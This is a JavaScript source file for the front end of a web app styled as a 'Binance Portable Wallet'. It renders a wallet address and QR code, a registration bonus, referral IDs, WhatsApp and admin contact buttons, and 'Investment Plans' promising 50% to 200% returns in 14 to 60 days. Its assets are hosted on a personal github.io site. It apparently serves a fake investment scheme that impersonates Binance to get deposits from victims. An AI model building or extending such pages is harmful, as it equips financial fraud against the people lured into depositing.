function returnToDefault() {
   location.reload()
};

const user_acc = JSON.parse(localStorage.getItem("reg_user"));
let user_name_id;
let user_email_id;
let user_refereal_id;

if (localStorage.hasOwnProperty("reg_user")) {
   user_name_id = user_acc.username;
   user_email_id = user_acc.email;
   user_refereal_id = user_acc.username + "_" + "bnb" + "_" + promo_id;
}
else {
   user_name_id = "Username";
   user_email_id = "Email";
   user_refereal_id = "Refereal";
}

const wallet_table = `
<table style="color:white">
<tr>
<td><b>Promo ID:</b></td>
<td>${promo_id}</td>
<td></td>
</tr>

<tr>
<td><b>Coin: </b></td>
<td>
<select onchange="setCryptoCoin(this)">
<option value="BTC">BTC</option>
<option value="ETH">ETH</option>
<option value="USDT">USDT</option>
<option value="BNB">BNB</option>
</select>
</td>
<td id="coin_balance"></td>
</tr>

<tr>
<td><b>FX :</b></th>
<td>
<select onchange="setFiatCurrency(this)">
<option value="USD">USD</option>
<option value="EUR">EUR</option>
<option value="KRW">KRW</option>
<option value="JPY">JPY</option>
</select>
</td>
<td id="fx_balance"></td>
</tr>

</table>

<section class="exchange_panel">${currency_data}</section>
`;

const navWalletMenu = `
<aside>
<button onclick="dropDownNavMenu()">&#9776;</button>
<h1 id="menuHeadline">Binance Portable Wallet</h1>
<span>
<ol id="menuListing">
<span><b>Wallet Address:</b> ${bnb_wallet.slice(0, 10)}...</span>
<li onclick="controlPage(this)">Home</li>
<li onclick="controlPage(this)">Portfolio</li>
<li onclick="controlPage(this)">Withdrawals</li>
<li onclick="controlPage(this)">Investment Plans</li>
<li onclick="controlPage(this)">Settings</li>
</ol>
</span>
</aside>

<div id="wallet_table">${wallet_table}</div>
`;

$("#wallet_menu").html(navWalletMenu);

// bnbMain

const arrayPost = [writeUp1, writeUp2];
const randomPost = arrayPost[Math.floor(Math.random() * arrayPost.length)];

const arrayAd = [ad1, ad2, ad3, ad4, ad5, ad6];
const randomAds = arrayAd[Math.floor(Math.random() * arrayAd.length)];

const mainPageShow = `
<section>
   <div id="post_write_up">${randomPost}</div>

   <div id="post_center">
   <p onclick="approveInvestment()">
   <img src="https://abouelghar12.github.io/icon/bitcoin.png">
   <span>Bitcoin</span>
   </p>

   <p onclick="approveInvestment()">
   <img src="https://abouelghar12.github.io/icon/bnb.png">
   <span>Binance</span>
   </p>

   <p onclick="approveInvestment()">
   <img src="https://abouelghar12.github.io/icon/ethereum.png">
   <span>Ethereum</span>
   </p>

   <p onclick="approveInvestment()">
   <img src="https://abouelghar12.github.io/icon/tether.png">
   <span>Tether</span>
   </p>

   <p onclick="approveInvestment()">
   <img src="https://abouelghar12.github.io/icon/doge.png">
   <span>Dogecoin</span>
   </p>
   </div>

   <div id="promo_write_up">
   <img src="https://abouelghar12.github.io/pic/promo.png">
   <section>
   ${randomAds}
   </section>
   </div>

</section>

`;

const showPortfolio = `
<section id="portfolioContainer">

<h1>Token Portfolio</h1>

<table>
<tr>
<th>Transactions</th>
<th>Description</th>
<th>Amount</th>
</tr>

<tr>
<td><b>Bonus:</b></td>
<td><p class="table_transactions">Registration Bonus Token sent to <i>${promo_id}</i></p></td>
<td>
   <div id="bonus_amount_row" class="table_amount_row">
   <ul>
   <li><b>${promoBonus.toLocaleString('en-US', { style: 'currency', currency: 'USD', })}</b></li>
   |
   <li>2/6/2023</li>
   </ul>
   </div>
</td>
</tr>

<tr>
<td><b id="user_payment_coin"></b></td>
<td><p id="user_payment_details" class="table_transactions"></p></td>
<td>
   <div id="user_amount_row" class="table_amount_row"></div>
</td>
</tr>

<tr>
<td><h3>Total</h3></td>
<td></td>
<td><h3><span id="bnb_total_amount">${available_balance}</span></h3></td>
</tr>

</table>

</section>

`;

const tableBtn = `<td class="investTableLast"><button class="flex_plan_btn" onclick="getAppPlan(this)">Select</button></td>`;

const showInvestment = `
<section id="investmentContainer">

<h1>Investment Plans</h1>

<table>
<tr>
<th class="investTableBegin">Binance Plan</th>
<th class="investTableMiddle">Return On Investment (ROI)</th>
<th class="investTableLast"><button id="reset_investment_btn" onclick="resetInvestmentPanel()">&#10227;</button></th>
</tr>

<tr>
<td class="investTableBegin"><b class="flex_plan">Bi-Flex</b></td>
<td class="investTableMiddle"><span class="flex_choose_plan">Return over 50% on Investment in 14 Days</span></td>
${tableBtn}
</tr>

<tr>
<td class="investTableBegin"><b class="flex_plan">Bi-Flex Mini</b></td>
<td class="investTableMiddle"><span class="flex_choose_plan">Return over 75% on Investment in 30 Days</span></td>
${tableBtn}
</tr>

<tr>
<td class="investTableBegin"><b class="flex_plan">Bi-Flex Max</b></td>
<td class="investTableMiddle"><span class="flex_choose_plan">Return over 100% on Investment in 45 Days</span></td>
${tableBtn}
</tr>

<tr>
<td class="investTableBegin"><b class="flex_plan">Bi-Flex Pro</b></td>
<td class="investTableMiddle"><span class="flex_choose_plan">Return over 200% on Investment 60 Days</span></td>
${tableBtn}
</tr>

</table>

</section>

`;

const showSettings = `
<section id="settingsContainer">
<h1>App Settings</h1>
<div id="app_settings">

<section id="app_settings1">
<img src="https://abouelghar12.github.io/pic/settings_bg.png" />
</section>

<section id="app_settings2">
<div>
<h3>Account Details</h3>
<p id="app_details">
<span><b>Username:</b> ${user_name_id}</span>
<span><b>Email: </b> ${user_email_id}</span>
<span><b>Refereal: </b> <span onclick="getWalletAddr(this)">${user_refereal_id}</span></span>
</p>
</div>

<div>
<h3 id="app_wallet_header">Wallet Address (${walletBalance.toLocaleString('en-US', {
   style: 'currency',
   currency: 'USD',
})})
</h3>

<p id="app_main_wallets">
<span>

<span class="app_wallet_icons">
<img src="https://abouelghar12.github.io/icon/bnb.png">
<span class="app_wallet_addr" onclick="getWalletAddr(this)">${bnb_wallet}</span>
</span>

<span> 
<img id="app_wallet_barcode" src="https://abouelghar12.github.io/barcode/bnb.jpg" />
</span>

<span class="app_wallet_btn">
<input id="app_wallet_btn_input" type="text" placeholder="Enter Wallet Address">
<button onclick="sendCryptoBalance(this)">Send</button>
</span>

</span>
</p>

</div>
</section>

</div>
</section>
`;

const showMessage = `
<section>

<div id="message_container">

<div id="preload_message"></div>

<section id="messagebox_content">

<div>
<p><b>From: </b> <input id="msg_user" type="email" readonly value="${user_email_id}"/></p>
<p><b>To: </b> <input id="msg_admin" type="email" readonly value="${admin_email}"/></p>
<p><b>Subject</b> <input id="msg_subject" type="text" placeholder="Enter Subject"/></p>
</div>

<div>
<p>
<textarea id="msg_textarea" placeholder="Write here..."></textarea>
<button id="msg_btn" onclick="sendAppMsg(this)">Send</button>
</p>
</div>

</section>
</div>
</section>
`

$("#bnbMain").html(
   `
   <div id="chatContainer">
   <img onclick="whatsApp()" src="https://abouelghar12.github.io/icon/Whatsapp.svg" /> 
   <img onclick="msgApp()" src="https://abouelghar12.github.io/icon/mailbox.webp" />
   </div>

   <div id="bnbMainContainer">
   ${mainPageShow}
   </div>
   `
)

